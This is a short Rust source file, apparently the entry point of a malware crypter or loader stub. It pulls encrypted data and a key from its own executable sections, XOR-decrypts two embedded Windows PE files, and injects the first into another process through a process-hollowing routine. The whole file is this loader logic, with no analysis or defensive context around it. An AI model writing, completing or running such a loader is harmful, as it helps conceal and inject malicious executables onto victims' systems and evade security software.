use pe_helpers::is_valid_pe_file;
use pe_sections::{get_data_sections, get_key_section};
use hollowing::execute_on_remote_thread;

mod pe_sections;
mod pe_helpers;
mod hollowing;
mod crypt;

fn main() {
    let encrypted_data = get_data_sections().to_vec();
    let key = get_key_section();

    let mut pos = 0;

    let first_file_len = u64::from_le_bytes(encrypted_data[pos..pos+8].try_into().unwrap()) as usize;
    pos += 8;
    
    let mut first_file = encrypted_data[pos..pos+first_file_len].to_vec();
    crypt::xor_data(&mut first_file, &key);
    pos += first_file_len;

    if !is_valid_pe_file(&first_file) {
        panic!("First file is not a valid PE")
    }
    
    let mut second_file = encrypted_data[pos..].to_vec();
    crypt::xor_data(&mut second_file, &key);

    if !is_valid_pe_file(&second_file) {
        panic!("Second file is not valid PE");
    }

    println!("Files successfully decrypted!");
    
    unsafe { 
        execute_on_remote_thread(&first_file).unwrap();
    }
}